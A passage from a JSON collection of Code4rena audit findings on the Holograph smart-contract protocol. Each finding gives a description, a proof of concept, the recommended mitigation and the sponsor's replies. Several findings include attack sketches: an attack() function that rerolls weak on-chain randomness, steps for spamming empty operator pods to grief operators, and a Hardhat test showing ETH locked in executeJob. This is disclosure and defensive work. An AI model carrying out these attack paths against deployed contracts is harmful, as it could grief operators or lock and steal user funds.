supported\");\n        }\n      } catch (bytes memory reason) {\n        if (reason.length == 0) {\n          revert(\"ERC20: no ERC165 support\");\n        } else {\n          assembly {\n            revert(add(32, reason), mload(reason))\n          }\n        }\n      }\n    } else {\n      return true;\n    }\n\nIn essence, if the target is a contract, the enforcer requires it to fully implement EIP-4524. The problem is that [this](https://eips.ethereum.org/EIPS/eip-4524) EIP is just a draft proposal, which the project cannot assume to be supported by any receiver contract, and definitely not every receiver contract.\n\nThe specs warn us:\n\n```\n⚠️ This EIP is not recommended for general use or implementation as it is likely to change.\n\n```\n\nTherefore, it is a very dangerous requirement to add in an ERC20 enforcer, and must be left to the implementation to do if it so desires.\n\n### Impact\n\nERC20s enforced by HolographERC20 are completely uncomposable. They cannot be used for almost any DeFi application, making it basically useless.\n\n### Recommended Mitigation Steps\n\nRemove the EIP-4524 requirements altogether.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1297240122):**\n > Low risk unless this is not a design decision.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1306639824):**\n > Originally a design choice, but it can be updated to not revert if the EIP is not supported.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#issuecomment-1306719396):**\n > Will argue that philosophically any code is originally a design choice. If it's later made clear the choice has unintended dire consequences then the finding should not be penalized because of that alone. \n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/440#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the HolographERC20 ERC20 enforcer for Holograph, which is used for enforcing ERC20 tokens. The enforcer requires any target contract to fully implement EIP-4524, which is a draft proposal and not recommended for general use or implementation. This requirement makes the ERC20s enforced by HolographERC20 completely uncomposable, which means they cannot be used for almost any DeFi application, making them basically useless. The recommended mitigation step for this vulnerability is to remove the EIP-4524 requirements altogether. The bug was discovered through manual audit.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/440",
      "tags": [
        "EIP-4524"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "5601",
      "title": "[M-08] `_payoutEth()` calculates `balance` with an offset, always leaving dust `ETH` in the contract",
      "impact": "MEDIUM",
      "content": "\n[PA1D.sol#L391](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L391)<br>\n[PA1D.sol#L395](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L395)<br>\n\nPayout recipients can call `getEthPayout()` to transfer the ETH balance of the contract to all payout recipients.<br>\nThis function makes an internal call to `_payoutEth`, which sends the payment to the recipients based on their associated `bp`.\n\nThe issue is that the `balance` used in the `transfer` calls is not the contract ETH balance, but the balance minus a `gasCost`.\n\nThis means `getEthPayout()` calls will leave dust in the contract.\n\n### Impact\n\nIf the dust is small enough, a subsequent call to `getEthPayout` is likely to revert because of [this check](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L390).<br>\nAnd `enforcer/PA1D` does not have any other ETH withdrawal function. While `enforcer/PA1D` is meant to be used via delegate calls from a NFT collection contract, if the NFT contract does not have any withdrawal function either, this dust mentioned above is effectively lost.\n\n### Proof of Concept\n\nLet us take the example of a payout recipient trying to retrieve their share of the balance, equal to `40_000` For simplicity, assume one payout address, owned by Alice:\n\n*   Alice calls `getEthPayout()`, which in turn calls `_payoutEth()`\n*   `gasCost = (23300 * length) + length = 23300 + 1 = 23301`\n*   `balance = address(this).balance = 40000`\n*   `balance - gasCost = 40000 - 23301 = 16699`,\n*   `sending = ((bps[i] * balance) / 10000) = 10000 * 16699 / 10000 = 16699`\n*   Alice receives `16699`.\n\nAlice has to wait for the balance to increase to call `getEthPayout()` again. But no matter what, there will always be at least a dust of `10000` left in the contract.\n\n### Recommended Mitigation Steps\n\nThe transfers should be done based on `address(this).balance`. The `gasCost` is redundant as the gas amount is specified by the caller of `getEthPayout()`, the contract does not have to provide gas.\n\n```diff\n-391: balance = balance - gasCost;\n392:     uint256 sending;\n393:     // uint256 sent;\n394:     for (uint256 i = 0; i < length; i++) {\n395:       sending = ((bps[i] * balance) / 10000);\n396:       addresses[i].transfer(sending);\n397:       // sent = sent + sending;\n398:     }\n```\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294771534):**\n > I think this is intended, a bit weird why 23300 is chosen, why gas price is not considered and why the withheld fund is not sent to the caller tho. Related to [`#164`](https://github.com/code-423n4/2022-10-holograph-findings/issues/164) and [`#106`](https://github.com/code-423n4/2022-10-holograph-findings/issues/106)\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294789604):**\n > It doesn't make sense that it's intentional, because gas is never provided by contract, only EOA. Contract can only relay gas passed to it. But interesting to hear what the team says.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1294821170):**\n > Agreed, but still seems to be low risk.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#issuecomment-1307929686):**\n > This is a valid issue and this function will be refactored.\n\n**[alexanderattar (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/476#ref-pullrequest-1469977783):**\n > [Feature/holo 612 royalty smart contract improvements](https://github.com/holographxyz/holograph-protocol/pull/93)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the 'enforcer/PA1D' contract which is part of the '2022-10-holograph' GitHub repository. The issue is that the `getEthPayout()` function is sending the payments to the payout recipients based on the `balance` minus a `gasCost` instead of the actual contract ETH balance. This means that when the `getEthPayout()` function is called, it will leave a small amount of ETH (known as 'dust') in the contract which cannot be retrieved. \n\nThe impact of this vulnerability is that if the dust is small enough, a subsequent call to `getEthPayout` is likely to fail due to a check in the code. If the 'enforcer/PA1D' contract does not have any other ETH withdrawal function and the NFT contract it is being used with also does not have any withdrawal functions, then the dust mentioned above is effectively lost.\n\nThe bug can be demonstrated using an example of a payout recipient trying to retrieve their share of the balance, equal to `40_000`. If the gas cost is 23301, then the recipient will only receive 16699, leaving 10000 in the contract. \n\nThe bug was discovered through manual analysis and the mitigation is to make sure that the transfers are done based on `address(this).balance` and that the `gasCost` is redundant as the gas amount is specified by the caller of `getEthPayout()`. The code should be changed to reflect this.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/476",
      "tags": [
        "Refund Ether"
      ],
      "finders": [
        "d3e4",
        "Trust",
        "Jeiwan",
        "joestakey",
        "Aymen0909"
      ]
    },
    {
      "id": "5600",
      "title": "[M-07]  Attacker can force chaotic operator behavior",
      "impact": "MEDIUM",
      "content": "\n[HolographOperator.sol#L875](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L875)<br>\n\nOperators are organized into different pod tiers. Every time a new request arrives, it is scheduled to a random available pod. It is important to note that pods may be empty, in which case the pod array actually has a single zero element to help with all sorts of bugs. When a pod of a non existing tier is created, any intermediate tiers between the current highest tier to the new tier are filled with zero elements. This happens at bondUtilityToken():\n\n    if (_operatorPods.length < pod) {\n      /**\n       * @dev activate pod(s) up until the selected pod\n       */\n      for (uint256 i = _operatorPods.length; i <= pod; i++) {\n        /**\n         * @dev add zero address into pod to mitigate empty pod issues\n         */\n        _operatorPods.push([address(0)]);\n      }\n    }\n\nThe issue is that any user can spam the contract with a large amount of empty operator pods. The attack would look like this:\n\n1.  bondUtilityToken(attacker, large_amount, high_pod_number)\n2.  unbondUtilityToken(attacker, attacker)\n\nThe above could be wrapped in a flashloan to get virtually any pod tier filled.\n\nThe consequence is that when the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. Therefore, the chosen operator will be 0, which is referred to in the code as \"open season\". In this occurrance, any operator can perform the executeJob() call. This is of course really bad, because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This would be a practical example of a griefing attack on Holograph.\n\n### Impact\n\nAny user can force chaotic \"open season\" operator behavior\n\n### Recommended Mitigation Steps\n\nIt is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics.\n\n**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/432#issuecomment-1308891591):**\n > Good catch. This will be updated to mitigate.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the HolographOperator.sol code, which can be found on GitHub at the given link. This vulnerability allows any user to force chaotic \"open season\" operator behavior. This is done by spamming the contract with a large amount of empty operator pods. This attack is done by using a flashloan to get virtually any pod tier filled. If the scheduler chooses pods uniformally, they will very likely choose an empty pod, with the zero address. This means any operator can perform the executeJob() call, which is bad because all but one operator continually waste gas for executions that will be reverted after the lucky first transaction goes through. This could be used as a griefing attack on Holograph. To mitigate this issue, it is important to pay special attention to the scheduling algorithm, to make sure different pods are given execution time according to the desired heuristics.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/432",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "csanuragjain",
        "Trust"
      ]
    },
    {
      "id": "5599",
      "title": "[M-06] Bad source of randomness",
      "impact": "MEDIUM",
      "content": "\n[HolographOperator.sol#L491-L511](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511)<br>\n\nUsing `block.number` and `block.timestamp` as a source of randomness is commonly advised against, as the outcome can be manipulated by calling contracts. In this case a compromised layer-zero-endpoint would be able to retry the selection of the primary operator until the result is favorable to the malicious actor.\n\n### Proof of Concept\n\nAn attack path for rerolling the result of bad randomness might look roughly like this:\n\n```js\nfunction attack(uint256 currentNonce, uint256 wantedPodIndex, uint256 numPods, uint256 wantedOperatorIndex, uint256 numOperators,  bytes calldata bridgeInRequestPayload) external{\n\n    bytes32 jobHash = keccak256(bridgeInRequestPayload);\n\n    //same calculation as in HolographOperator.crossChainMessage\n    uint256 random = uint256(keccak256(abi.encodePacked(jobHash, currentNonce, block.number, block.timestamp)));\n\n    require(wantedPodIndex == random % numPods)\n    require(wantedOperatorIndex == random % numOperators);\n\n    operator.crossChainMessage(bridgeInRequestPayload);\n}\n```\n\nThe attack basically consists of repeatedly calling the `attack` function with data that is known and output that is wished for until the results match and only then continuing to calling the operator.\n\n### Recommended Mitigation Steps\n\nConsider using a decentralized oracle for the generation of random numbers, such as [Chainlinks VRF](https://docs.chain.link/docs/vrf/v2/introduction/).\n\nIt should be noted, that in this case there is a prerequirement of the layer-zero endpoint being compromised, which confines the risk quite a bit, so using a normally unrecommended source of randomness could be acceptable here, considering the tradeoffs of integrating a decentralized oracle.\n\n**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/427#issuecomment-1308894416):**\n > Very valid issue.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/427#issuecomment-1320939907):**\n > While sponsor noted this is a design choice to use pseudorandomness, as pointed out by the warden a compromised layer-zero-endpoint can exploit this for profit, judging this as Medium risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability of using block.number and block.timestamp as a source of randomness in the code located at https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L491-L511. It is commonly advised against using these sources as the outcome can be manipulated by calling contracts. A malicious actor with access to the layer-zero-endpoint could retry the selection of the primary operator until the result is favorable to them. The attack consists of repeatedly calling the attack function with data that is known and output that is wished for until the results match and only then continuing to calling the operator. Manual review was used to identify the vulnerability. It is recommended to consider using a decentralized oracle for the generation of random numbers, such as Chainlinks VRF. However, considering the prerequirement of the layer-zero endpoint being compromised, using an unrecommended source of randomness may be acceptable.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/427",
      "tags": [
        "VRF"
      ],
      "finders": [
        "d3e4",
        "__141345__",
        "Deivitto",
        "cdahlheimer",
        "ladboy233",
        "nadin",
        "teawaterwire",
        "adriro",
        "V_B",
        "minhtrng"
      ]
    },
    {
      "id": "5598",
      "title": "[M-05] It is possible that operator loses sent ETH after calling `HolographOperator` contract's `executeJob` function",
      "impact": "MEDIUM",
      "content": "\nETH can be sent when calling the `HolographOperator` contract's `executeJob` function, which can execute the following code.\n\n```solidity\nFile: contracts\\HolographOperator.sol\n419:     try\n420:       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(\n421:         msg.sender,\n422:         bridgeInRequestPayload\n423:       )\n424:     {\n425:       /// @dev do nothing\n426:     } catch {\n427:       _failedJobs[hash] = true;\n428:       emit FailedOperatorJob(hash);\n429:     }\n```\n\nExecuting the `try ... {...} catch {...}` code mentioned above will execute `HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(...)`. Calling the `nonRevertingBridgeCall` function can possibly execute `revert(0, 0)` if the external call to the bridge contract is not successful. When this occurs, the code in the `catch` block of the `try ... {...} catch {...}` code mentioned above will run, which does not make calling the `executeJob` function revert. As a result, even though the job is not successfully executed, the sent ETH is locked in the `HolographOperator` contract since there is no other way to transfer such sent ETH out from this contract. In this situation, the operator that calls the `executeJob` function will lose the sent ETH.\n\n<https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L301-L439>\n\n```solidity\n  function executeJob(bytes calldata bridgeInRequestPayload) external payable {\n    \n    ...\n\n    /**\n     * @dev execute the job\n     */\n    try\n      HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(\n        msg.sender,\n        bridgeInRequestPayload\n      )\n    {\n      /// @dev do nothing\n    } catch {\n      _failedJobs[hash] = true;\n      emit FailedOperatorJob(hash);\n    }\n    /**\n     * @dev every executed job (even if failed) increments total message counter by one\n     */\n    ++_inboundMessageCounter;\n    /**\n     * @dev reward operator (with HLG) for executing the job\n     * @dev this is out of scope and is purposefully omitted from code\n     */\n    ////  _bondedOperators[msg.sender] += reward;\n  }\n```\n\n<https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L445-L478>\n\n```solidity\n  function nonRevertingBridgeCall(address msgSender, bytes calldata payload) external payable {\n    require(msg.sender == address(this), \"HOLOGRAPH: operator only call\");\n    assembly {\n      /**\n       * @dev remove gas price from end\n       */\n      calldatacopy(0, payload.offset, sub(payload.length, 0x20))\n      /**\n       * @dev hToken recipient is injected right before making the call\n       */\n      mstore(0x84, msgSender)\n      /**\n       * @dev make non-reverting call\n       */\n      let result := call(\n        /// @dev gas limit is retrieved from last 32 bytes of payload in-memory value\n        mload(sub(payload.length, 0x40)),\n        /// @dev destination is bridge contract\n        sload(_bridgeSlot),\n        /// @dev any value is passed along\n        callvalue(),\n        /// @dev data is retrieved from 0 index memory position\n        0,\n        /// @dev everything except for last 32 bytes (gas limit) is sent\n        sub(payload.length, 0x40),\n        0,\n        0\n      )\n      if eq(result, 0) {\n        revert(0, 0)\n      }\n      return(0, 0)\n    }\n  }\n```\n\n### Proof of Concept\n\nFirst, please add the following `OperatorAndBridgeMocks.sol` file in `src\\mock\\`.\n\n```solidity\npragma solidity 0.8.13;\n\n// OperatorMock contract simulates the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions\ncontract OperatorMock {\n    bool public isJobExecuted = true;\n\n    BridgeMock bridgeMock = new BridgeMock();\n\n    // testExecuteJob function here simulates the logic flow used in HolographOperator.executeJob function\n    function testExecuteJob() external payable {\n        try IOperatorMock(address(this)).testBridgeCall{value: msg.value}() {\n        } catch {\n            isJobExecuted = false;\n        }\n    }\n    \n    // testBridgeCall function here simulates the logic flow used in HolographOperator.nonRevertingBridgeCall function\n    function testBridgeCall() external payable {\n        // as a simulation, the external call that sends ETH to bridgeMock contract will revert\n        (bool success, ) = address(bridgeMock).call{value: msg.value}(\"\");\n        if (!success) {\n            assembly {\n                revert(0, 0)\n            }\n        }\n        assembly {\n            return(0, 0)\n        }\n    }\n}\n\ninterface IOperatorMock {\n    function testBridgeCall() external payable;\n}\n\ncontract BridgeMock {\n    receive() external payable {\n        revert();\n    }\n}\n```\n\nThen, please add the following `POC.ts` file in `test\\`.\n\n```typescript\nimport { expect } from \"chai\";\nimport { ethers } from \"hardhat\";\n\ndescribe('POC', () => {\n    it(\"It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function\", async () => {\n        // deploy operatorMock contract that simulates\n        //   the logic flows used in HolographOperator contract's executeJob and nonRevertingBridgeCall functions\n        const OperatorMockFactory = await ethers.getContractFactory('OperatorMock');\n        const operatorMock = await OperatorMockFactory.deploy();\n        await operatorMock.deployed();\n\n        await operatorMock.testExecuteJob({value: 500});\n\n        // even though the job is not successfully executed, the sent ETH is locked in operatorMock contract\n        const isJobExecuted = await operatorMock.isJobExecuted();\n        expect(isJobExecuted).to.be.eq(false);\n        expect(await ethers.provider.getBalance(operatorMock.address)).to.be.eq(500);\n    });\n});\n```\n\nLast, please run `npx hardhat test test/POC.ts --network hardhat`. The `It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function` test will pass to demonstrate the described scenario.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nIn the `catch` block of the `try ... {...} catch {...}` code mentioned above in the Impact section, the code can be updated to transfer the `msg.value` amount of ETH back to the operator, which is `msg.sender` for the `HolographOperator` contract's `executeJob` function, when this described situation occurs.\n\n**[ACC01ADE (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/418#issuecomment-1308898962):**\n > Good catch, good POC.\n\n**[gzeon (judge) decreased severity to Medium](https://github.com/code-423n4/2022-10-holograph-findings/issues/418)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report describes a vulnerability in the HolographOperator contract's executeJob function, where ETH can be sent when calling the function but the job is not successfully executed and the ETH is locked in the contract. This can result in the operator that calls the function losing the sent ETH. A proof of concept is provided using OperatorAndBridgeMocks.sol and POC.ts, which demonstrates the described scenario. The recommended mitigation step for this vulnerability is to update the code in the catch block of the try ... {...} catch {...} code mentioned in the Impact section to transfer the msg.value amount of ETH back to the operator when the described situation occurs.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/418",
      "tags": [
        "Refund Ether"
      ],
      "finders": [
        "rbserver"
      ]
    },
    {
      "id": "5597",
      "title": "[M-04] Incorrect implementation of ERC721 may have bad consequences for receiver",
      "impact": "MEDIUM",
      "content": "\n[HolographERC721.sol#L467](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467)<br>\n\nHolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code:\n\n    if (_isContract(to)) {\n      require(\n        (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &&\n          ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &&\n          ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==\n          ERC721TokenReceiver.onERC721Received.selector),\n        \"ERC721: onERC721Received fail\"\n      );\n    }\n\nIf the target address is a contract, the enforcer requires the target's `onERC721Received()` to succeed. However, the call deviates from the [standard](https://eips.ethereum.org/EIPS/eip-721):\n\n    interface ERC721TokenReceiver {\n        /// @notice Handle the receipt of an NFT\n        /// @dev The ERC721 smart contract calls this function on the recipient\n        ///  after a `transfer`. This function MAY throw to revert and reject the\n        ///  transfer. Return of other than the magic value MUST result in the\n        ///  transaction being reverted.\n        ///  Note: the contract address is always the message sender.\n        /// @param _operator The address which called `safeTransferFrom` function\n        /// @param _from The address which previously owned the token\n        /// @param _tokenId The NFT identifier which is being transferred\n        /// @param _data Additional data with no specified format\n        /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n        ///  unless throwing\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);\n    }\n\nThe standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the `address(this)` value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.\n\n### Impact\n\nERC721 transferFrom's \"to\" contract may fail to accept transfers, or record credit of transfers incorrectly.\n\n### Recommended Mitigation Steps\n\nPass the msg.sender parameter, as the ERC721 standard requires.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/469#issuecomment-1306626633):**\n > This will be updated to pass msg.sender instead of Holograph address to match the standard.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/469#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue found in the HolographERC721.sol contract, which is an enforcer contract that fully implements ERC721. The bug is related to the safeTransferFromFunction, in which the code deviates from the ERC721 standard. The standard requires that the first parameter should be the operator, but the enforcer passes the address(this) value instead. This means that any bookkeeping done in the target contract, and the decision of allowing or disallowing the transaction, is based on false information.\n\nThe impact of this bug is that the ERC721 transferFrom's \"to\" contract may fail to accept transfers, or record credit of transfers incorrectly. The bug was found through manual audit.\n\nThe recommended mitigation step for this bug is to pass the msg.sender parameter, as the ERC721 standard requires.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/469",
      "tags": [
        "ERC721"
      ],
      "finders": [
        "adriro",
        "Trust"
      ]
    },
    {
      "id": "5596",
      "title": "[M-03] Beaming job might freeze on dest chain under some conditions, leading to owner losing (temporarily) access to token",
      "impact": "MEDIUM",
      "content": "\n[HolographOperator.sol#L255](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L255)<br>\n\nIf the following conditions have been met:\n\n*   The selected operator doesn't complete the job, either intentionally (they're sacrificing their bonded amount to harm the token owner) or innocently (hardware failure that caused a loss of access to the wallet)\n*   Gas price has spiked, and isn't going down than the `gasPrice` set by the user in the bridge out request\n\nThen the bridging request wouldn't complete and the token owner would loos access to the token till the gas price goes back down again.\n\n### Proof of Concept\n\nThe fact that no one but the selected operator can execute the job in case of a gas spike has been proven by the test ['Should fail if there has been a gas spike'](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/test/14\\_holograph_operator_tests.ts#L834-L844) provided by the sponsor.\n\nAn example of a price spike can be in the recent month in the Ethereum Mainnet where the min gas price was 3 at Oct 8, but jumped to 14 the day after and didn't go down since then (the min on Oct 9 was lower than the avg of Oct8, but users might witness a momentarily low gas price and try to hope on it). See the [gas price chat on Etherscan](https://etherscan.io/chart/gasprice) for more details.\n\n### Recommended Mitigation Steps\n\nIn case of a gas price spike, instead of refusing to let other operators to execute the job, let them execute the job without slashing the selected operator. This way, after a while also the owner can execute the job and pay the gas price.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296344314):**\n > If there is a gas spike, it is too expensive to execute the transaction, so we should not force executor to do it. I think it is intended behavior that TX just doesnt execute until gas falls back down.<br>\n> The docs state there is a refund mechanism that is activated in this case, back to origin chain.\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296346189):**\n > > The docs state there is a refund mechanism that is activated in this case, back to origin chain.\n> \n> Can you please point where in the docs does it state that?<br>\n> Also, regardless of the docs, that kind of mechanism is certainly not implemented.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296349735):**\n > https://docs.holograph.xyz/holograph-protocol/operator-network-specification<br>\n> Operator Job Selection:<br>\n> \"Operator jobs are given specific gas limits. This is meant to prevent gas spike abuse (e.g., as a form of DoS attack), bad code, or smart contract reverts from penalizing good-faith operators. If an operator is late to finalize a job and another operator steps in to take its place, if the gas price is above the set limit, the selected operator will not get slashed. A job is considered successful if it does not revert, or if it reverts but gas limits were followed correctly. Failed jobs can be re-done (for an additional fee), can be returned to origin chain (for an additional fee), or left untouched entirely. This shifts the financial responsibility towards users, rather than operators.\"\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296351047):**\n > Thanks, wasn't aware of that at time of submission.<br>\n> But the docs specifically talk about 'failed jobs', in this case the job wouldn't even be marked as failed since nobody would be able to execute the `executeJob()` function (the `require(gasPrice >= tx.gasprice` would revert the entire function rather than move to the catch block)\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296351620):**\n > I think the assumption is that tx.gasprice will eventually come back to a non-reverting amount. Agree that it seems like a good idea to add a force-fail after EXPIRY_NUM blocks passed, without executing the TX.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1307835385):**\n > Agree that it seems like a good idea to add a force-fail after EXPIRY_NUM blocks passed, without executing the TX.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the HolographOperator.sol code on GitHub. The vulnerability occurs when the selected operator fails to complete the job, either intentionally or innocently, and the gas price has spiked and not gone down below the set gasPrice. In this situation, the bridging request won't complete and the token owner will lose access to the token until the gas price goes down again. Proof of concept has been provided in the form of a test case, and an example of a gas price spike in the Ethereum Mainnet is also given. The recommended mitigation step is to allow other operators to execute the job without slashing the selected operator, so that the token owner can eventually execute the job and pay the gas price.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/170",
      "tags": [
        "Gas Price",
        "Business Logic"
      ],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "5595",
      "title": "[M-02] `_payoutToken[s]()` is not compatible with tokens with missing return value",
      "impact": "MEDIUM",
      "content": "\n[PA1D.sol#L317](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L317)<br>\n[PA1D.sol#L340](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L340)<br>\n\nPayout is blocked and tokens are stuck in contract.\n\n### Proof of Concept\n\n`PA1D._payoutToken()` and `PA1D._payoutTokens()` call `ERC20.transfer()` in a require-statement to send tokens to a list of payout recipients.<br>\nSome tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. But since the require-statement expects a `bool`, for such a token a `void` return will also cause a revert, despite an otherwise successful transfer. That is, the token payout will always revert for such tokens.\n\n### Recommended Mitigation Steps\n\nUse [OpenZeppelin's SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol), which handles the return value check as well as non-standard-compliant tokens.\n\n**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/456#issuecomment-1306632476):**\n > Low priority, but can be updated to ensure compatibility with all ERC20 tokens.\n\n**[alexanderattar (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/456#issuecomment-1306632476):**\n > [Feature/holo 612 royalty smart contract improvements](https://github.com/holographxyz/holograph-protocol/pull/93)\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the code of the project 2022-10-holograph, which is hosted on GitHub. It has been determined that the code for the `PA1D._payoutToken()` and `PA1D._payoutTokens()` functions is causing a problem when attempting to transfer tokens to a list of payouts recipients. This is because some tokens do not return a boolean value, which causes the require-statement to revert despite a successful transfer. This means that the token payout is blocked and the tokens are stuck in the contract.\n\nThe bug was discovered through code inspection and the recommended mitigation step is to use OpenZeppelin's SafeERC20, which handles the return value check as well as non-standard-compliant tokens. This will ensure that the token payout is successful and the tokens are not stuck in the contract.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Holograph",
      "source_link": "https://code4rena.com/reports/2022-10-holograph",
      "github_link": "https://github.com/code-423n4/2022-10-holograph-findings/issues/456",
      "tags": [
        "transferFrom vs safeTransferFrom",
        "Weird ERC20",
        "SafeTransfer"
      ],
      "finders": [
        "d3e4",
        "Trust",
        "pashov",
